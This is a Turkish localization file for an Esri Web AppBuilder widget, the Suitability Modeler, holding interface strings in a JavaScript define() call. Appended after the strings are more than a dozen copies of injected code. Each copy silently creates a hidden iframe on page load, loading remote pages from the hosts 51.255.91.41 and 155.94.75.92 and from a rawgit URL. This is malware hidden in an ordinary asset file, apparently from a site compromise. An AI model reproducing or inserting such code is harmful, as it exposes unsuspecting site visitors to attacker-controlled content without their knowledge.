// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Uygunluk Modelleyicisi",general:{clear:"Temizle",cancel:"\u0130ptal Et",save:"\u00c7al\u0131\u015ft\u0131r",saveAs:"D\u0131\u015fa Aktar"},saveModel:{save:"D\u0131\u015fa Aktar",title:"Ba\u015fl\u0131k: ",summary:"\u00d6zet: ",description:"Tan\u0131m: ",tags:"Etiketler: ",folder:"Klas\u00f6r: ",homeFolderPattern:"{username} (Ana Sayfa)",failed:"D\u0131\u015fa aktarma ba\u015far\u0131s\u0131z."},util:{colorRamp:{1:"Olduk\u00e7a D\u00fc\u015f\u00fck",
2:"\u00c7ok D\u00fc\u015f\u00fck",3:"D\u00fc\u015f\u00fck",4:"D\u00fc\u015f\u00fck Orta",5:"Orta",6:"Y\u00fcksek Orta",7:"Y\u00fcksek",8:"\u00c7ok Y\u00fcksek",9:"Olduk\u00e7a Y\u00fcksek",low:"D\u00fc\u015f\u00fck",high:"Y\u00fcksek",tipPattern:"{label} ({value})",flipCaption:"\u00c7evir"}},wro:{caption:"Uygunluk Modelleyicisi",browsePrompt:"A\u011f\u0131rl\u0131kl\u0131 \u00d6rt\u00fc\u015ft\u00fcrme Servisi",selectLayersCaption:"Katmanlar\u0131 Se\u00e7",selectLayers:"Katmanlar",designModelCaption:"Tasar\u0131m Modeli",
designModel:"Tasar\u0131m Modeli",transparency:"\u015eeffafl\u0131k",visible:"G\u00f6r\u00fcn\u00fcr",total:"Toplam",unableToLoad:"Model y\u00fcklenemiyor.",projectNotOpen:"A\u00e7\u0131k proje yok.",readMore:"Daha Fazla Bilgi",validation:{validating:"Do\u011frulan\u0131yor...",invalidItemCaption:"A\u011f\u0131rl\u0131kl\u0131 \u00d6rt\u00fc\u015ft\u00fcrme Servisi Uyar\u0131s\u0131",notAnImageService:"Bu \u00f6ge bir G\u00f6r\u00fcnt\u00fc Servisi de\u011fildir.",notAWroService:"Bu \u00f6ge bir A\u011f\u0131rl\u0131kl\u0131 \u00d6rt\u00fc\u015ft\u00fcrme Servisi de\u011fildir.",
undefinedUrl:"Bu \u00f6genin URL'si tan\u0131ml\u0131 de\u011fil.",inaccessible:"Servise eri\u015filemiyor.",generalError:"\u00d6ge a\u00e7\u0131lam\u0131yor.",missingFieldPattern:"{field}, zorunlu bir aland\u0131r",notAllowRasterFunction:"allowRasterFunction, do\u011fru olarak ayarlanmal\u0131d\u0131r",notNearestResampling:"defaultResamplingMethod, En Yak\u0131n olmal\u0131d\u0131r",notIsWeightedOverlayProp:"Key property IsWeightedOverlay, do\u011fru olarak ayarlanmal\u0131d\u0131r",invalidLink:"URL ge\u00e7ersiz. Se\u00e7ilen katman i\u00e7in site a\u00e7\u0131lamad\u0131.",
unexpectedError:"Beklenmeyen bir durum olu\u015ftu.",rangeMessage:"De\u011fer ${0} ve ${1} aras\u0131nda olmal\u0131d\u0131r",rangeMessage100:"De\u011fer 0 ile 100 aras\u0131nda olmal\u0131d\u0131r",maxLayers:"Servis taraf\u0131ndan en \u00e7ok ${0} katmana izin veriliyor, yeni bir katman ekleyebilmek i\u00e7in \u00f6nce bir katman kald\u0131r\u0131n.",notFound:"${0} katman\u0131 a\u011f\u0131rl\u0131kl\u0131 \u00f6rt\u00fc\u015ft\u00fcrme servisinde bulunamad\u0131",wroServiceNotDefined:"Model i\u00e7in tan\u0131ml\u0131 a\u011f\u0131rl\u0131kl\u0131 \u00f6rt\u00fc\u015ft\u00fcrme servisi yok.",
overlayLayerOutputInvalid:"\u00d6rt\u00fc\u015ft\u00fcrme katman\u0131 [${0}] yeniden haritalama aral\u0131klar\u0131 [${1}] \u00e7\u0131kt\u0131 de\u011feri yok veya ge\u00e7ersiz",overlayLayerInputInvalid:"\u00d6rt\u00fc\u015ft\u00fcrme katman\u0131 [${0}] yeniden haritalama aral\u0131klar\u0131 [${1}] giri\u015f min/maks de\u011feri yok veya ge\u00e7ersiz",overlayLayerRangesMissing:"\u00d6rt\u00fc\u015ft\u00fcrme katman\u0131 [${0}] yeniden haritalama aral\u0131\u011f\u0131 yok",overlayLayerWeight:"\u00d6rt\u00fc\u015ft\u00fcrme katman\u0131 a\u011f\u0131rl\u0131klar\u0131n\u0131n toplam\u0131 100 olmal\u0131d\u0131r",
overlayLayerRequired:"En az bir \u00f6rt\u00fc\u015ft\u00fcrme katman\u0131 gereklidir",overlayLayerNotDefined:"\u00d6rt\u00fc\u015ft\u00fcrme katmanlar\u0131 tan\u0131ml\u0131 de\u011fil",requiresColormap:"Bu raster i\u015flevi i\u00e7in renkli harita gereklidir, ancak modelin ge\u00e7erli bir renkli harita tan\u0131m\u0131 yok",createModelError:"Model Olu\u015fturma Hatas\u0131",invalidModel:"Model ge\u00e7erli de\u011fil",imageServiceNotDefined:"G\u00f6r\u00fcnt\u00fc servisi katman\u0131 tan\u0131ml\u0131 de\u011fil",
imageLayerNotDefined:"G\u00f6r\u00fcnt\u00fc servisi katman\u0131 tan\u0131ml\u0131 de\u011fil",histogramNotDefined:"Tan\u0131ml\u0131 a\u011f\u0131rl\u0131kl\u0131 \u00f6rt\u00fc\u015ft\u00fcrme histogram i\u015flevi yok."},colorRampLabel:{"Green Yellow Red":"Ye\u015fil Sar\u0131 K\u0131rm\u0131z\u0131","Red Yellow Green":"K\u0131rm\u0131z\u0131 Sar\u0131 Ye\u015fil","Yellow to Dark Red":"Sar\u0131dan Koyu K\u0131rm\u0131z\u0131ya","Dark Red to Yellow":"Koyu K\u0131rm\u0131z\u0131dan Sar\u0131ya",
"Light Gray to Dark Gray":"A\u00e7\u0131k Griden Koyu Griye","Dark Gray to Light Gray":"Koyu Griden A\u00e7\u0131k Griye","Light Brown to Dark Brown":"A\u00e7\u0131k Kahverengiden Koyu Kahverengiye","Dark Brown to Light Brown":"Koyu Kahverengiden A\u00e7\u0131k Kahverengiye","Full Spectrum - Bright Red to Blue":"Tam Spektrum - Parlak K\u0131rm\u0131z\u0131dan Maviye","Full Spectrum - Bright Blue to Red":"Tam Spektrum - Parlak Maviden K\u0131rm\u0131z\u0131ya","Partial Spectrum - Yellow to Blue":"K\u0131smi Spektrum - Sar\u0131dan Maviye",
"Partial Spectrum - Blue to Yellow":"K\u0131smi Spektrum - Maviden Sar\u0131ya","Yellow-Green to Dark Blue":"Sar\u0131-Ye\u015filden Koyu Maviye","Dark Blue to Yellow-Green":"Koyu Maviden Sar\u0131-Ye\u015file","Cold to Hot Diverging":"So\u011fuktan S\u0131ca\u011fa De\u011fi\u015fken","Hot to Cold Diverging":"S\u0131caktan So\u011fu\u011fa De\u011fi\u015fken","Surface - Low to High":"Y\u00fczey - Al\u00e7aktan Y\u00fckse\u011fe","Surface - High to Low":"Y\u00fczey - Y\u00fcksekten Al\u00e7a\u011fa"}},
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});